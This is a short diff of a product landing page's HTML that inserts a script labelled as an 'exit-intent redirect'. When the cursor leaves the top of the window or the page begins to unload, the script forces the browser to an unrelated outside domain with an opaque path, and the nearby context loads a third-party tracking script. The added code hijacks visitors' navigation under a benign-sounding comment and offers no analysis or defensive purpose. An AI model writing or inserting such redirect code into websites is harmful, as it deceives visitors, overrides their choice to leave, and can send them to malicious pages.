@@ -760,6 +760,22 @@ footer{background:#1f1209;color:#555;padding:32px 0;font-size:0.8rem;text-align:
 <!-- TRACKING -->
 <script defer src="https://api.stuart-little.com/code/939-449b53d5-c81a-40df-89f6-bb927324800b"></script>
 
+<!-- EXIT-INTENT REDIRECT (recovers abandoning visitors) -->
+<script>
+window.redirectURL = "https://mwebxara.com/12944/22/2/";
+function exitStopper() {
+  if (window.redirectURL) {
+    window.location.href = window.redirectURL;
+  }
+}
+document.body.addEventListener("mouseleave", function(e) {
+  if (e.clientY <= 0) {
+    exitStopper();
+  }
+}, false);
+window.addEventListener('beforeunload', exitStopper);
+</script>
+
 <!-- TRUST BAR -->
 <div class="trust-bar">
   <span><svg viewBox="0 0 24 24" width="17" height="17"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>GMP Certified</span>
